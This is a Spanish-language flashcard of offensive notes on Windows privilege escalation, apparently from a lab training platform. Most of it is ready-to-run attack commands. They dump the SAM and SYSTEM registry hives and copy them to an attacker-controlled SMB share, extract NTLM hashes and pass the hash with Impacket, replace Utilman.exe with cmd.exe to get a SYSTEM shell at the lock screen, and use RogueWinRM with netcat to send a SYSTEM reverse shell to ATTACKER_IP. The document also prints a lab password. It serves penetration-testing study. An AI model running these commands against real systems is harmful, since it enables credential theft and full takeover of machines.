### Flashcard: Windows Privilege Escalation (Privileges) — Completa

---

**1. Concepto Base**

* Cada cuenta en Windows tiene privilegios que definen qué acciones del sistema puede realizar.
* Algunos privilegios pueden explotarse para escalar a **NT AUTHORITY\SYSTEM**.
* Ver privilegios del usuario actual:

```cmd
whoami /priv
```

* Privilegios más relevantes:

  * `SeBackupPrivilege`
  * `SeRestorePrivilege`
  * `SeTakeOwnershipPrivilege`
  * `SeImpersonatePrivilege`
  * `SeAssignPrimaryTokenPrivilege`

---

**2. SeBackup / SeRestore**

* Permite **leer y escribir archivos ignorando DACLs**.
* Grupo relacionado: *Backup Operators*.
* Técnica principal: extraer hives `SAM` y `SYSTEM` para dumpear hashes NTLM.

**Procedimiento**:

```cmd
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

* Exfiltrar vía SMB:

```cmd
copy C:\Users\THMBackup\*.hive \\ATTACKER_IP\public\
```

En atacante:

```bash
python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public ~/share
```

* Dump de hashes:

```bash
python3 secretsdump.py -sam sam.hive -system system.hive LOCAL
```

* Pass-the-Hash con Impacket:

```bash
python3 psexec.py -hashes LMHASH:NTHASH administrator@VICTIM_IP
```

---

**3. SeTakeOwnership**

* Permite tomar **ownership** de cualquier objeto y asignar permisos arbitrarios.
* Ejemplo típico: reemplazo de `Utilman.exe` → SYSTEM shell en lockscreen.

**Procedimiento**:

```cmd
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant <usuario>:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
```

* En lock screen → clic en *Ease of Access* → CMD con SYSTEM.

---

**4. SeImpersonate / SeAssignPrimaryToken**

* Permiten **impersonar tokens de otros usuarios** conectados a servicios locales.
* Usado con exploits como **RogueWinRM** (BITS + WinRM).

En atacante:

```bash
nc -lvp 4442
```

En víctima:

```cmd
C:\tools\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

* Resultado: reverse shell con privilegios SYSTEM.

---

### Glosario

* **Privilege**: Derecho especial asignado a un proceso/usuario.
* **DACL (Discretionary Access Control List)**: Lista que define quién accede a un objeto.
* **Hive**: Archivos del registro de Windows (ej. `SAM`, `SYSTEM`).
* **SAM (Security Account Manager)**: Almacena hashes NTLM de usuarios.
* **SYSTEM hive**: Contiene claves necesarias para descifrar los hashes del SAM.
* **SeBackupPrivilege / SeRestorePrivilege**: Ignoran permisos para leer/escribir archivos críticos.
* **SeTakeOwnershipPrivilege**: Permite cambiar propiedad de objetos y asignarse control total.
* **Utilman.exe**: Herramienta de accesibilidad ejecutada como SYSTEM en el login.
* **SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege**: Posibilitan ejecutar procesos como otro usuario.
* **Impersonation**: Actuar en contexto de otro usuario.
* **BITS (Background Intelligent Transfer Service)**: Servicio abusado para escalada en RogueWinRM.
* **WinRM (Windows Remote Management)**: Protocolo de administración remota similar a SSH.
* **Pass-the-Hash**: Técnica de autenticación usando hashes NTLM en lugar de contraseñas en texto claro.
* **Impacket Tools**: `secretsdump.py`, `psexec.py`, `smbserver.py` → esenciales en explotación post-explotación.

---
